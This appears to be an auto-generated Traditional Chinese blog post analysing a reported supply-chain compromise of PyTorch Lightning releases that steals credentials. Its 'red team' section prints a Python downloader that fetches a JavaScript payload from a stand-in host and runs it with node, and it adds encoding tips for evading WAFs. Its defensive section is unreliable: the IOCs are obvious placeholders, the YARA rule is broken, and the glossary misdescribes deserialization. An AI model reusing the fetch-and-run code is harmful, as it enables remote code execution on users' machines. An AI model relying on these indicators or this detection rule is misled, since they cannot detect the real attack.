---
layout: post
title:  "PyTorch Lightning and Intercom-client Hit in Supply Chain Attacks to Steal Credentials"
date:   2026-04-30 19:09:35 +0000
categories: [security]
severity: critical
---

# 🚨 解析 PyTorch Lightning 供應鏈攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Credential Theft
> * **關鍵技術**: Deserialization, JavaScript Payload, npm Package Hijacking

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: PyTorch Lightning 的 `lightning` 模組中存在一個隱藏的 `_runtime` 目錄，包含一個下載器和一個混淆的 JavaScript Payload。當 `lightning` 模組被導入時，會自動執行這個 Payload，導致遠程代碼執行和憑證竊取。
* **攻擊流程圖解**:
  1. User 安裝受駭的 PyTorch Lightning 包（版本 2.6.2 或 2.6.3）
  2. `lightning` 模組被導入
  3. `_runtime` 目錄中的下載器被執行
  4. 下載器下載並執行混淆的 JavaScript Payload
  5. Payload竊取憑證並將其上傳到遠程伺服器
* **受影響元件**: PyTorch Lightning 2.6.2 和 2.6.3 版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 需要有 PyTorch Lightning 的使用權限和網路連接
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import requests
    
    # 下載器代碼
    def download_payload():
        url = "https://example.com/payload.js"
        response = requests.get(url)
        with open("payload.js", "wb") as f:
            f.write(response.content)
    
    # 執行 Payload
    def execute_payload():
        os.system("node payload.js")
    
    download_payload()
    execute_payload()
    
    ```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 Base64 編碼或壓縮 Payload

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /tmp/payload.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule PyTorch_Lightning_Malware {
      meta:
        description = "Detects PyTorch Lightning malware"
      strings:
        $a = "payload.js"
      condition:
        $a at pe.entry_point
    }
    
    ```
* **緩解措施**:
 1. 更新 PyTorch Lightning 至最新版本
 2. 刪除受駭的包和 Payload
 3. 更改使用者憑證和密碼

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **Deserialization**: 將序列化的資料轉換回原始資料結構的過程。可以用於攻擊，例如將惡意代碼序列化並上傳到遠程伺服器。
* **JavaScript Payload**: 一種使用 JavaScript 編寫的惡意代碼，可以用於攻擊和竊取資料。
* **npm Package Hijacking**: 一種攻擊方式，涉及將惡意代碼注入到 npm 包中，以竊取使用者的憑證和資料。

## 5. 🔗 參考文獻與延伸閱讀

* [原始報告](https://thehackernews.com/2026/04/pytorch-lightning-compromised-in-pypi.html)
* [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


